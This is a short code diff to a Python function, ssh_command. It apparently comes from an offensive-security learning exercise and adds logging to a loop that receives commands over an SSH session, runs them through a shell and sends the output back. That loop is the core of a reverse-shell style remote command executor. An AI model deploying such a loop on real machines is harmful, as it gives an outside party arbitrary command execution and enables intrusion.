@@ -24,7 +24,10 @@ def ssh_command(ip, port, user, passwd):
         while True:
             command = ssh_session.recv(1024)
             try:
-                cmd_output = subprocess.check_output(command.decode('utf-8'), shell=True)
+                cmd_input = command.decode('utf-8')
+                print('[<] Received input "{}"'.format(cmd_input))
+                cmd_output = subprocess.check_output(cmd_input, shell=True)
+                print('[>] Sending output "{}"'.format(cmd_output.decode('utf-8').strip()))
                 ssh_session.send(cmd_output)
             except Exception as e:
                 ssh_session.send(str(e).encode())
